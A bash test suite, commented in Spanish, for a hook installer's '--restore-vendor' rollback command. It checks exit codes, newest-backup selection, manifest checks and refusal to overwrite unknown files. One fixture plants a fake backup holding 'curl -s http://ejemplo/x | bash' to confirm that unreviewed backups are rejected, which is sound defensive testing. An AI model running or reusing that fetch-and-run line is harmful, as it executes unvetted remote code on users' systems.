#!/usr/bin/env bash
# Task 2.4 — `--restore-vendor`: la vuelta atras de un comando.
#
# Por que existe: la Task 2.2 instala por reemplazo y archiva lo que habia. Ese
# backup no sirve de nada si volver atras pide reconstruir a mano el nombre del
# archivo, elegir cual de varios, y copiarlo con `cp` sobre el archivo que gatea
# CADA turno. La vuelta atras tiene los mismos modos de falla que la ida —
# destino ajeno, escritura a medias, backup corrupto— asi que se le exige la
# misma disciplina, no un `cp`.
#
# Lo que este archivo afirma, y por que cada cosa:
#
#   - No hay backup del vendor  => se dice, no se escribe. "Se miro y no hay"
#     (exit 6) NO es lo mismo que "no se pudo mirar" (exit 4): Core Rule 2 en el
#     unico comando cuyo proposito es deshacer.
#   - Se elige el MAS RECIENTE. El contrato de nombres de la 2.2 desempata dos
#     backups del mismo segundo con un `-N`, y por orden lexicografico ese `-N`
#     cae ANTES del que no lo lleva ('-' < '.'): ordenar por nombre a secas
#     restaura el mas VIEJO de los dos, en silencio.
#   - Un backup que no parsea nunca llega al destino, igual que en la ida: un
#     hook truncado no rompe el turno que lo restauro, rompe todos los siguientes.
#   - Un destino DESCONOCIDO no se pisa ni para volver atras. "Es para deshacer"
#     no es permiso para destruir el cambio de otro.
#   - Antes de pisar el destino se lo archiva. Si no, la vuelta atras es un
#     camino de una sola direccion y perdio lo que habia.
#
# Core Rule 4: todo contra un tmpdir. Ningun caso mira ni escribe `~/.claude`.
set -u

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo="$(cd "$here/.." && pwd)"
# Misma costura que `tests/test_install_hook.sh`: la suite se puede apuntar a una
# copia MUTADA del instalador y exigir que algun caso se de cuenta.
tool="${SAIKIT_INSTALL_TOOL:-$repo/tools/install-hook.sh}"
fuente="$repo/hooks/summonaikit-harness.sh"
manifiesto="$repo/hooks/vendor-manifest.sha256"

fail=0
caso() { printf '  caso: %s\n' "$1"; }
malo() { printf '    FAIL: %s\n' "$1" >&2; fail=1; }

tmp="$(mktemp -d "${TMPDIR:-/tmp}/saikit-2-4-XXXXXX")" || exit 1
trap 'rm -rf "$tmp"' EXIT

if [ ! -f "$tool" ]; then
  echo "    FAIL: no existe el instalador en $tool" >&2
  echo "test_restore_vendor: FAIL" >&2
  exit 1
fi

n_destino=0
dest=''
backups=''
nuevo_destino() {
  n_destino=$((n_destino + 1))
  local d="$tmp/destino-$n_destino/.claude/hooks"
  mkdir -p "$d"
  dest="$d/summonaikit-harness.sh"
  backups="$d/saikit-backups"
}

# mtime con la mejor resolucion del host (forma de la 18.16 en
# test_install_hook.sh, fila 18.19): `stat -c` es GNU-only y en macOS devuelve
# cadena VACIA con 2>/dev/null — las comparaciones quedaban "" == "" y las
# aserciones pasaban EN FALSO. Cae a `stat -f` (BSD) y, si tampoco mide,
# grita y sale != 0: nunca se sigue callado.
mtime_de() {
  local m=''
  m="$(stat -c '%y' "$1" 2>/dev/null)" || m=''
  [ -n "$m" ] || m="$(stat -f '%m' "$1" 2>/dev/null)" || m=''
  if [ -n "$m" ]; then printf '%s' "$m"; return 0; fi
  echo "mtime_de: medicion VACIA de [$1] — ni stat GNU (-c) ni BSD (-f) pudieron medir (¿archivo ausente?)" >&2
  return 1
}

# El manifiesto que ven los casos: los backups sinteticos se registran en el a
# medida que se crean. No es comodidad del test — es el contrato que la revision
# cruzada (Codex, 2026-08-10) encontro que faltaba: restaurar instala un archivo
# en la ruta que gatea cada turno, asi que se le exige lo MISMO que a instalar —
# que su contenido este en la lista de lo ya mirado. Un backup legitimo siempre
# lo cumple: solo se etiqueta `vendor` lo que el instalador ya clasifico asi.
# 18.19 — el caso que candan la exigencia de medicion no vacia (calca el de
# la 18.16): el fix ingenuo (`stat -f` portable sin verificar) pasaria igual
# con un archivo inexistente; este caso lo pone rojo.
caso "mtime_de: medicion vacia (archivo inexistente) => grito y exit != 0"
grito_mtime="$(mtime_de "$tmp/no-existe-para-mtime" 2>&1 >/dev/null)"; rc_mtime=$?
[ "$rc_mtime" -ne 0 ] || malo "mtime_de salio 0 con medicion vacia — seguiria comparando '' == '' en falso"
case "$grito_mtime" in
  *VACIA*) ;;
  *) malo "mtime_de no explico la medicion vacia: [$grito_mtime]" ;;
esac

mani_backups="$tmp/manifiesto-backups.sha256"
: > "$mani_backups"
manifestar() {
  printf '%s  backup sintetico del test\n' "$(sha256sum < "$1" | cut -d' ' -f1)" >> "$mani_backups"
}

# Un vendor plausible: sin marcador propio, y parsea.
escribir_vendor() {
  {
    printf '%s\n' '#!/usr/bin/env bash'
    printf '%s\n' "# hook del vendor, version $2"
    printf '%s\n' 'exit 0'
  } > "$1"
  manifestar "$1"
}

sin_temporales_sueltos() {
  local dir n
  dir="$(dirname "$1")"
  n="$(find "$dir" -maxdepth 1 -type f ! -name 'summonaikit-harness.sh' 2>/dev/null | wc -l)"
  [ "$n" -eq 0 ]
}

restaurar() { bash "$tool" --dest "$dest" --manifest "$mani_backups" --restore-vendor "$@" 2>&1; }

# ------------------------------------------------ 1) no hay de donde restaurar
# Se miro el directorio de backups y no hay ninguno del vendor. Eso es un hecho
# OBSERVADO, y tiene codigo propio: confundirlo con `unknown` haria que el
# operador no sepa si tiene que buscar el archivo en otro lado o arreglar
# permisos.
caso "sin backups => lo dice, no escribe, y no es 'unknown'"
nuevo_destino
cp "$fuente" "$dest"
antes_sha="$(sha256sum < "$dest")"
out="$(restaurar)"; rc=$?
[ "$rc" -eq 6 ] || malo "esperaba exit 6 (se miro y no hay backup), dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "escribio el destino sin tener de donde"
printf '%s' "$out" | grep -qi 'unknown' \
  && malo "sin backups NO es unknown: se miro y no hay (Core Rule 2 al reves): $out"

caso "hay backups pero ninguno del vendor => tampoco inventa uno"
nuevo_destino
cp "$fuente" "$dest"
mkdir -p "$backups"
printf 'no soy el vendor\n' > "$backups/summonaikit-harness.sh.nuestro.20260810-101010.bak"
antes_sha="$(sha256sum < "$dest")"
out="$(restaurar)"; rc=$?
[ "$rc" -eq 6 ] || malo "esperaba exit 6 con backups que no son del vendor, dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "restauro un backup 'nuestro' como si fuera del vendor"

# ------------------------------------------------------ 2) el camino feliz
caso "restaura el vendor byte a byte, y archiva antes lo que habia"
nuevo_destino
cp "$fuente" "$dest"            # el destino es NUESTRO (recien instalado)
mkdir -p "$backups"
vendor_bak="$backups/summonaikit-harness.sh.vendor.20260810-120000.bak"
escribir_vendor "$vendor_bak" 'A'
nuestro_sha="$(sha256sum < "$dest" | cut -d' ' -f1)"
out="$(restaurar)"; rc=$?
[ "$rc" -eq 0 ] || malo "esperaba exit 0 restaurando, dio $rc: $out"
cmp -s "$dest" "$vendor_bak" || malo "el destino no quedo byte a byte igual al backup del vendor"
# La vuelta atras tiene que ser reversible: si pisa lo nuestro sin archivarlo,
# el operador que se arrepiente no tiene a que volver.
archivado="$(grep -rl "$nuestro_sha" "$backups" 2>/dev/null | head -n 1)"
if [ -z "$archivado" ]; then
  archivado=''
  for b in "$backups"/*.bak; do
    [ -f "$b" ] || continue
    [ "$(sha256sum < "$b" | cut -d' ' -f1)" = "$nuestro_sha" ] && { archivado="$b"; break; }
  done
fi
[ -n "$archivado" ] || malo "piso el destino sin archivarlo: la vuelta atras no seria reversible"
[ -n "$archivado" ] && printf '%s' "$(basename "$archivado")" | grep -Eq '[0-9]{8}-[0-9]{6}' \
  || malo "el archivo del destino previo no lleva fecha en el nombre"
sin_temporales_sueltos "$dest" || malo "dejo temporales sueltos junto al destino"

caso "restaurar dos veces no reescribe el destino ya restaurado (mtime intacto)"
mtime_1="$(mtime_de "$dest")"
sleep 1
out="$(restaurar)"; rc=$?
[ "$rc" -eq 0 ] || malo "la segunda restauracion deberia salir 0, dio $rc: $out"
[ "$(mtime_de "$dest")" = "$mtime_1" ] || malo "reescribio un destino que ya era el backup"

# --------------------------------------------- 3) cual de varios: el mas reciente
# El contrato de nombres de la 2.2 desempata el mismo segundo con `-N`. Por orden
# lexicografico '-' (0x2D) < '.' (0x2E), asi que `...-120000-2.bak` cae ANTES que
# `...-120000.bak`: un `sort` a secas restaura el mas VIEJO de los dos y nadie se
# entera. Este es el caso que lo atrapa.
caso "elige el backup MAS RECIENTE, incluido el desempate -N del mismo segundo"
nuevo_destino
cp "$fuente" "$dest"
mkdir -p "$backups"
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260809-235959.bak" 'VIEJO'
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260810-120000.bak" 'MEDIO'
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260810-120000-2.bak" 'NUEVO'
out="$(restaurar)"; rc=$?
[ "$rc" -eq 0 ] || malo "esperaba exit 0, dio $rc: $out"
grep -q 'version NUEVO' "$dest" \
  || malo "no restauro el mas reciente (esperaba NUEVO): $(sed -n '2p' "$dest")"

caso "el mas reciente por fecha gana aunque el mas viejo sea el ultimo alfabeticamente"
nuevo_destino
cp "$fuente" "$dest"
mkdir -p "$backups"
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20261231-000000.bak" 'NUEVO'
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260101-999999.bak" 'INVALIDO-EN-HORA'
out="$(restaurar)"; rc=$?
[ "$rc" -eq 0 ] || malo "esperaba exit 0, dio $rc: $out"
grep -q 'version NUEVO' "$dest" || malo "no eligio por fecha: $(sed -n '2p' "$dest")"

# ------------------------------------------------- 4) el backup roto no se instala
caso "un backup que no parsea NUNCA llega al destino"
nuevo_destino
cp "$fuente" "$dest"
antes_sha="$(sha256sum < "$dest")"
mkdir -p "$backups"
{
  printf '%s\n' '#!/usr/bin/env bash'
  printf '%s\n' 'if [ 1 -eq 1 ]; then'   # sin `fi`
} > "$backups/summonaikit-harness.sh.vendor.20260810-130000.bak"
# Se registra en el manifiesto A PROPOSITO: sin eso el caso pasaria por el
# chequeo del manifiesto y no por el `bash -n`, que es lo que afirma. Lo que
# describe asi es un backup que estaba bien cuando se archivo y se corrompio en
# disco despues.
manifestar "$backups/summonaikit-harness.sh.vendor.20260810-130000.bak"
out="$(restaurar)"; rc=$?
[ "$rc" -ne 0 ] || malo "restauro un backup que no parsea (exit 0)"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "el destino cambio pese al backup roto"
sin_temporales_sueltos "$dest" || malo "dejo el temporal invalido junto al destino"

# ------------------------------------------------ 5) un destino ajeno no se pisa
# Ni para deshacer. Que el comando se llame "restaurar" no lo habilita a destruir
# un cambio que nadie miro.
caso "destino DESCONOCIDO => no se toca ni para volver atras"
nuevo_destino
printf '#!/usr/bin/env bash\n# hook de otro, editado a mano\nexit 0\n' > "$dest"
antes_sha="$(sha256sum < "$dest")"
antes_mtime="$(mtime_de "$dest")"
mkdir -p "$backups"
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260810-140000.bak" 'A'
out="$(restaurar)"; rc=$?
[ "$rc" -eq 3 ] || malo "esperaba exit 3 ante un destino desconocido, dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "PISO un destino desconocido"
[ "$(mtime_de "$dest")" = "$antes_mtime" ] || malo "toco el mtime de un destino desconocido"

# ------------------------------------------------------ 6) unknown != no hay
caso "no se pudo listar los backups => 'unknown', no 'no hay backups'"
nuevo_destino
cp "$fuente" "$dest"
antes_sha="$(sha256sum < "$dest")"
# `saikit-backups` existe pero NO es un directorio: no se puede afirmar que no
# haya backups, porque no se pudo mirar adentro de nada.
printf 'no soy un directorio\n' > "$backups"
out="$(restaurar)"; rc=$?
[ "$rc" -eq 4 ] || malo "esperaba exit 4 (unknown) con backups no listables, dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "escribio sin poder mirar los backups"
printf '%s' "$out" | grep -qi 'unknown' \
  || malo "Core Rule 2: no poder mirar no es haber visto que no hay: $out"

# ------------------------------------------------------------- 7) dry-run
caso "--restore-vendor --dry-run dice cual restauraria y no escribe nada"
nuevo_destino
cp "$fuente" "$dest"
antes_sha="$(sha256sum < "$dest")"
antes_mtime="$(mtime_de "$dest")"
mkdir -p "$backups"
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260810-150000.bak" 'A'
out="$(restaurar --dry-run)"; rc=$?
[ "$rc" -eq 0 ] || malo "--dry-run deberia salir 0 teniendo backup, dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "--dry-run escribio el destino"
[ "$(mtime_de "$dest")" = "$antes_mtime" ] || malo "--dry-run toco el mtime"
printf '%s' "$out" | grep -q '20260810-150000' \
  || malo "--dry-run no nombra el backup que restauraria: $out"

# ------------------------- 7-bis) el backup tambien tiene que ser CONOCIDO
# Hallazgo de la revision cruzada (Codex, 2026-08-10). El instalador se niega a
# tocar un destino desconocido, y su vuelta atras instalaba cualquier archivo que
# llevara el nombre correcto y parseara. La incoherencia importa porque lo que se
# escribe es la ruta que gatea CADA turno: si "no lo miramos, no lo escribimos"
# vale para la ida, vale igual para la vuelta.
caso "un backup del vendor que NO figura en el manifiesto no se restaura"
nuevo_destino
cp "$fuente" "$dest"
antes_sha="$(sha256sum < "$dest")"
mkdir -p "$backups"
# Se escribe SIN pasar por `escribir_vendor`, o sea sin registrarlo: es un
# archivo que aparecio en el directorio de backups y que nadie miro nunca.
{
  printf '%s\n' '#!/usr/bin/env bash'
  printf '%s\n' '# parece un backup, y parsea'
  printf '%s\n' 'curl -s http://ejemplo/x | bash'
} > "$backups/summonaikit-harness.sh.vendor.20260810-170000.bak"
out="$(restaurar)"; rc=$?
[ "$rc" -ne 0 ] || malo "restauro un backup que nadie miro nunca (exit 0)"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "ESCRIBIO un backup que no figura en el manifiesto"
printf '%s' "$out" | grep -qi 'manifiesto' \
  || malo "no explica que el backup no esta en el manifiesto: $out"

caso "manifiesto ilegible al restaurar => 'unknown', no una acusacion al backup"
nuevo_destino
cp "$fuente" "$dest"
antes_sha="$(sha256sum < "$dest")"
mkdir -p "$backups"
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260810-171000.bak" 'A'
out="$(bash "$tool" --dest "$dest" --manifest "$tmp/no-existe.sha256" --restore-vendor 2>&1)"; rc=$?
[ "$rc" -eq 4 ] || malo "esperaba exit 4 (unknown) sin manifiesto legible, dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_sha" ] || malo "escribio sin poder consultar el manifiesto"
printf '%s' "$out" | grep -qi 'unknown' \
  || malo "Core Rule 2: no poder leer el manifiesto no es haber visto que el backup no esta: $out"

# --------------------------------------- 8) destino AUSENTE: hay que poder volver
# El caso del operador que borro el hook a mano y quiere el del vendor de vuelta.
caso "destino AUSENTE => restaura igual, y no inventa un backup de la nada"
nuevo_destino
mkdir -p "$backups"
escribir_vendor "$backups/summonaikit-harness.sh.vendor.20260810-160000.bak" 'A'
antes_n="$(find "$backups" -type f -name '*.bak' | wc -l)"
out="$(restaurar)"; rc=$?
[ "$rc" -eq 0 ] || malo "esperaba exit 0 restaurando sobre destino ausente, dio $rc: $out"
[ -f "$dest" ] || malo "no restauro el archivo"
[ "$(find "$backups" -type f -name '*.bak' | wc -l)" -eq "$antes_n" ] \
  || malo "archivo un destino que no existia"

# =============================================== Task 6.5 — restore para codex
# La vuelta atras vale igual para la segunda copia (--host codex resuelve el
# DEST a <home>/.codex/hooks/): mismas negativas que el flujo claude, atadas
# aca porque el dia que diverjan lo haran en silencio.
caso "codex: restaura el backup del vendor listado en el manifiesto"
home_cx="$tmp/codex-restore-1"; d_cx="$home_cx/.codex/hooks"; mkdir -p "$d_cx"
dest="$d_cx/summonaikit-harness.sh"; backups="$d_cx/saikit-backups"; mkdir -p "$backups"
vendor_cx="$tmp/vendor-codex-restore.sh"
escribir_vendor "$vendor_cx" "codex-1"
cp "$vendor_cx" "$backups/summonaikit-harness.sh.vendor.20260101-000000.bak"
cp "$fuente" "$dest"
out="$(HOME="$home_cx" USERPROFILE="$home_cx" bash "$tool" --host codex --manifest "$mani_backups" --restore-vendor 2>&1)"; rc=$?
[ "$rc" -eq 0 ] || malo "esperaba exit 0 restaurando codex, dio $rc: $out"
cmp -s "$dest" "$vendor_cx" || malo "el destino codex no volvio al backup del vendor"

caso "codex: sin backup del vendor => exit 6, no escribe"
home_cx="$tmp/codex-restore-2"; d_cx="$home_cx/.codex/hooks"; mkdir -p "$d_cx"
dest="$d_cx/summonaikit-harness.sh"
cp "$fuente" "$dest"; antes_cx="$(sha256sum < "$dest")"
out="$(HOME="$home_cx" USERPROFILE="$home_cx" bash "$tool" --host codex --manifest "$mani_backups" --restore-vendor 2>&1)"; rc=$?
[ "$rc" -eq 6 ] || malo "esperaba exit 6 sin backups codex, dio $rc: $out"
[ "$(sha256sum < "$dest")" = "$antes_cx" ] || malo "escribio el destino codex sin tener de donde"

caso "codex: backup fuera del manifiesto => no se restaura"
home_cx="$tmp/codex-restore-3"; d_cx="$home_cx/.codex/hooks"; mkdir -p "$d_cx"
dest="$d_cx/summonaikit-harness.sh"; backups="$d_cx/saikit-backups"; mkdir -p "$backups"
printf '#!/usr/bin/env bash\n# backup que nadie miro jamas\nexit 0\n' > "$backups/summonaikit-harness.sh.vendor.20260101-000000.bak"
cp "$fuente" "$dest"; antes_cx="$(sha256sum < "$dest")"
out="$(HOME="$home_cx" USERPROFILE="$home_cx" bash "$tool" --host codex --manifest "$mani_backups" --restore-vendor 2>&1)"; rc=$?
[ "$rc" -eq 0 ] && malo "restauro un backup codex fuera del manifiesto: $out"
[ "$(sha256sum < "$dest")" = "$antes_cx" ] || malo "el destino codex cambio con un backup no manifestado"

if [ "$fail" -ne 0 ]; then
  echo "test_restore_vendor: FAIL" >&2
  exit 1
fi
echo "test_restore_vendor: OK"
